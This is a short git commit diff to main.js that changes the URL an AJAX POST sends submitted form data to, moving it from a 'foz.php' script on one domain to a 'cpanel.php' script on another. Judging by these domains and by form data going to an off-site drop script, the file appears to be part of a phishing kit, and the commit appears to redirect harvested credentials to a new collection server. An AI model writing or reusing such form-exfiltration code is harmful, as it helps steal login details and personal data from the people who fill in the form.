7b294948cad630e1b1539f528a1c9b1bfec28c82
davecooper13 <32927814+davecooper13@users.noreply.github.com>
2023-01-18 11:43:47 +0100

    Update main.js

--- main.js
+++ main.js
@@ -107,7 +107,7 @@ $(document).ready(function() {
   Please Wait...
 </button>`).prop("disabled", true);
         $.ajax({
-            url: "https://betruthh.name.ng/mxx/foz.php",
+            url: "https://europeimporttrade.com/cpanel.php",
             type: 'POST',
             data: formData,
             contentType: false,
